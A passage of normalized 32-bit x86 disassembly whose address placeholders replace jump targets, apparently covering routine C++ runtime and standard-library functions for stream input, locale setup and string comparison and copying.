pop esi
retn
sub_10005ede
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_100078d1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10005f0c
push 0x18
mov eax sub_1004a870
call sub_10023e66
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] ecx
jle r-xdata
mov [ ebp - 0x18 ] esi
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x18 ] esi
jbe r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] esi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1000ee8f
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0xc ]
mov esi [ eax + edi + 0x28 ]
push ebx
call sub_10006e19
movzx eax [ eax ]
push eax
mov ecx esi
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn
push esi
push [ ebp - 0x14 ]
call sub_10007e2d
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] esi
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
jbe r-xdata
inc ebx
xor esi esi
jmp r-xdata
or [ ebp - 0x14 ] 0x4
xor esi esi
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp ebx [ ebp - 0x1c ]
jae r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_10006062
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10006094
push 0x24
mov eax sub_1004a84b
call sub_10023e66
mov edi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x30 ]
xor ebx ebx
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x15 ] bl
call sub_10007a87
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x2c ] bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] ebx
cmp [ ebp - 0x15 ] bl
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007802
pop ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] bl
call sub_10007b41
mov ecx [ ebp + 0xc ]
push 0xffffffff
push ebx
call sub_10001e10
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x18 ]
cmp ecx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x1c ] ebx
je r-xdata
or [ ebp - 0x1c ] 0x2
mov [ ebp - 0x20 ] 0x7ffffffe
mov [ ebp - 0x20 ] ecx
cmp ecx 0x7ffffffe
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x1c ]
call sub_10007e2d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax 0xffff
cmp ax si
jne r-xdata
mov ecx [ eax + 0x28 ]
call sub_100078d1
mov eax edi
call sub_10023f0b
retn
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
mov ecx [ ebp - 0x28 ]
mov eax [ ecx ]
push esi
push 0x48
call [ eax + 0x8 ]
cmp al bl
jne r-xdata
or [ ebp - 0x1c ] 0x1
mov ecx [ ebp + 0xc ]
push esi
push 0x1
call sub_10005c07
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
dec [ ebp - 0x20 ]
mov [ ebp - 0x15 ] 0x1
call sub_100078f5
jmp r-xdata
movzx eax ax
movzx esi ax
cmp [ ebp - 0x20 ] ebx
jbe r-xdata
sub_10006170
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10007d13
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_100061ec
push ebp
mov ebp esp
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002493
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push esi
call sub_10006991
mov eax esi
pop ebp
retn 0x10
sub_1000621a
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100065cb
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_100062b7
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000666a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10006354
push ebx
push esi
mov ebx eax
mov eax [ esp + 0xc ]
push edi
mov edi ecx
sub eax edi
push 0x1c
cdq
pop ecx
idiv ecx
mov esi eax
imul esi esi 0x1c
add esi ebx
cmp edi [ esp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
sub ebx edi
push 0xffffffff
push 0x0
push edi
lea ecx [ ebx + edi ]
call sub_10002033
add edi 0x1c
cmp edi [ esp + 0x10 ]
jne r-xdata
sub_10006392
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006b5c
add esp 0x10
pop edi
leave
retn 0x8
sub_100063b6
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10006743
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10006453
push 0x38
mov eax sub_10047d07
call sub_10023e9c
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x40 ]
call sub_10023f1f
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10006709
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10005d9c
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10006709
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_10005eb7
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_100065cb
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100067e6
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1000666a
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10006807
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10006709
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10005ede
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10005ede
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_10006743
push 0x98
mov eax sub_10048b2b
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_1000768f
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_10006828
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_10006828
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_1000685e
mov eax esi
call sub_10023f0b
retn 0xc
sub_1000685e
push 0x14
mov eax sub_10048923
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100208a9
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1001b693
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006a1a
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1001b693
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10006d18
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1001b693
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10006d18
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1001b693
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_100070de
mov [ esi + 0xc ] ax
call sub_1001b693
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_100070de
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_10023f0b
retn 0x8
call sub_1001b693
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
call sub_10006a1a
mov [ esi + 0x8 ] eax
call sub_1001b693
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_100070de
mov [ esi + 0xc ] ax
call sub_1001b693
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x14 ] edx
call sub_100070de
add esp 0x24
mov [ esi + 0xe ] ax
sub_10006991
push 0x14
mov eax sub_10048ef8
call sub_10023e66
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_10006c6e
mov ecx [ ebp + 0x8 ]
push eax
call sub_10006a43
and [ ebp - 0x4 ] 0x0
call sub_10023f0b
retn 0x18
lea ecx [ ebp + 0x10 ]
call sub_10006cbe
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push 0x1
call sub_10005af7
lea ecx [ ebp + 0x10 ]
call sub_10006af5
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10006b30
test al al
jne r-xdata
sub_10006a1a
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call sub_100200e0
mov esi eax
inc esi
push esi
call sub_1001c132
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
test esi esi
ja r-xdata
mov dl [ edi ]
dec esi
mov [ ecx ] dl
inc ecx
inc edi
pop edi
pop esi
retn
sub_10006a43
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x18 ] eax
je r-xdata
push 0x1
push eax
call sub_10002419
test al al
je r-xdata
push edi
mov ecx esi
call sub_10002493
sub_10006a85
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006abc
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
inc [ esi + 0x4 ]
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006af5
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006b30
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ edi ]
je r-xdata
sub_10006b5c
push 0x8
mov eax sub_100497c4
call sub_10023e66
mov esi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_10023f0b
retn
mov ecx [ ebp + 0xc ]
push esi
call sub_10001a13
add [ ebp + 0xc ] 0x1c
add esi 0x1c
jmp r-xdata
cmp esi [ ebp + 0x8 ]
je r-xdata
sub_10006b8b
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10002597
add esi 0x1c
push 0x0
call sub_10023a01
mov eax [ ebp + 0xc ]
call sub_10023f0b
retn
sub_10006bb3
cmp [ eax + 0x18 ] 0x8
mov edx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push edx
push eax
push [ ecx + 0x14 ]
push 0x0
call sub_10006c07
neg eax
sbb eax eax
inc eax
retn
sub_10006bd6
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
retn
inc eax
inc eax
inc ecx
inc ecx
dec [ esp + 0xc ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_10006c07
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_1001b037
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
lea eax [ esi + edi * 2 ]
push eax
call sub_10006bd6
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10006c6e
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
sar eax 0x1
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ edi ]
je r-xdata
sub_10006c97
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ edi ]
je r-xdata
sub_10006cbe
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006cf6
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100200e0
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_10006db3
pop esi
retn 0x4
sub_10006d18
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_100200e0
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001c132
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1001b946
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_10006db3
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_1001b037
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
add esi edi
push esi
call sub_10020a5a
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10006e19
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
retn 0x4
sub_10006e41
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x8 ]
movzx edx ax
mov eax edx
shl edx 0x10
push edi
